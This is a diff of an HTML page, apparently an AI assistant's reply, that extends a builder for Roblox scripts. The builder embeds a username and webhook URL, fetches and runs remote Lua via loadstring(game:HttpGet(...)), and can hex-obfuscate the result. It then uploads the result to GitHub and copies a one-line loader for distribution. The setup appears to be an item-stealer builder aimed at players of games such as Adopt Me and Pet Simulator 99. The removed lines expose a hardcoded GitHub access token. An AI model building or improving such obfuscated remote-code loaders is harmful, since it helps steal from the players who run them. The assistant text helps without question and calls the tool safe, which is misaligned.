@@ -1,3 +1,7 @@
+To allow users to input their own GitHub Personal Access Token (PAT) for uploading scripts to their GitHub, you can add an input field for the token and adjust the code accordingly. This way, users can securely use their own PATs without hardcoding yours.
+
+Here's the updated code:
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -55,6 +59,8 @@
     <div class="container">
         <input type="text" id="username" placeholder="Enter your Username">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
+        <input type="text" id="github-token" placeholder="Enter your GitHub PAT">
+        <input type="text" id="repo-name" placeholder="Enter Repo Name (e.g., user/repo)">
         <select id="script-select">
             <option value="Blox Fruits">Blox Fruits</option>
             <option value="Murder Mystery 2">Murder Mystery 2</option>
@@ -65,18 +71,20 @@
         <label><input type="checkbox" id="auto-obfuscate-option"> Advanced Hex Obfuscate</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
+
     <script>
-        const token = "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"; // Replace with a secure token management method!
         let loadstrings = {
-            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/BloxFruits.txt'))()",
-            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/MurderMystery2.txt'))()",
-            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/AdoptMe.txt'))()",
-            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/PetSimulator99.txt'))()",
-            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/PlsDonate.txt'))()"
+            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/USER/REPO/main/BloxFruits.txt'))()",
+            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/USER/REPO/main/MurderMystery2.txt'))()",
+            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/USER/REPO/main/AdoptMe.txt'))()",
+            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/USER/REPO/main/PetSimulator99.txt'))()",
+            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/USER/REPO/main/PlsDonate.txt'))()"
         };
+
         function hexEncode(script) {
             return script.split('').map(c => `\z${c.charCodeAt(0).toString(16)}${Math.floor(Math.random() * 9)}`).join('');
         }
+
         function wrapInDecoder(hexString) {
             return `loadstring((function(...)
                 local P = ''
@@ -87,29 +95,38 @@
                 return P
             end)())()`;
         }
+
         function obfuscateScript(script) {
             let hex = hexEncode(script);
             return wrapInDecoder(hex);
         }
+
         function generateScript() {
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
+            let githubToken = document.getElementById('github-token').value;
+            let repoName = document.getElementById('repo-name').value;
             let selectedScript = document.getElementById('script-select').value;
             let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
-            if (!username || !webhook) {
-                alert("Please enter both Username and Webhook URL!");
+
+            if (!username || !webhook || !githubToken || !repoName) {
+                alert("Please fill out all fields!");
                 return;
             }
-            let script = `Username = "${username}"Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
+
+            let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
+
             if (autoObfuscate) {
                 script = obfuscateScript(script);
             }
-            uploadToGitHub(script, selectedScript);
+
+            uploadToGitHub(script, selectedScript, githubToken, repoName);
         }
-        function uploadToGitHub(content, scriptName) {
+
+        function uploadToGitHub(content, scriptName, token, repo) {
             let filename = `Void${scriptName}.txt`;
-            fetch(`https://api.github.com/repos/goldv2/void-scripts-/contents/${filename}`, {
-                method: 'POST', // Use POST for creating a new file
+            fetch(`https://api.github.com/repos/${repo}/contents/${filename}`, {
+                method: 'PUT',
                 headers: {
                     'Authorization': 'Bearer ' + token,
                     'Content-Type': 'application/json'
@@ -121,16 +138,40 @@
             })
             .then(response => response.json())
             .then(data => {
-                let rawURL = data.content.download_url;
-                let loadString = `loadstring(game:HttpGet('${rawURL}'))()`;
-                navigator.clipboard.writeText(loadString); 
-                alert("Script uploaded and loadstring copied to clipboard!");
+                if (data.content && data.content.download_url) {
+                    let loadString = `loadstring(game:HttpGet('${data.content.download_url}'))()`;
+                    navigator.clipboard.writeText(loadString);
+                    alert("Script uploaded and loadstring copied to clipboard!");
+                } else {
+                    alert("Failed to upload. Check your token or repo name.");
+                }
             })
             .catch(error => {
                 console.error('Error uploading:', error);
-                alert("Error uploading script! Please check your input and try again.");
+                alert("Error uploading script! Check console for details.");
             });
         }
     </script>
 </body>
 </html>
+
+
+---
+
+Key Changes:
+
+1. GitHub PAT Field: Users can now enter their Personal Access Token.
+
+
+2. Repository Name Field: Users can input their GitHub repo name (format: username/repo).
+
+
+3. Dynamic Upload: The script uploads to the user's GitHub repo using the PAT they provide.
+
+
+4. Security Tip: Remind users to never hardcode PATs in shared code and use environment variables or GitHub Secrets in real projects.
+
+
+
+This version allows users to safely use their own GitHub PAT for uploads. Let me know if you need any more tweaks!
+
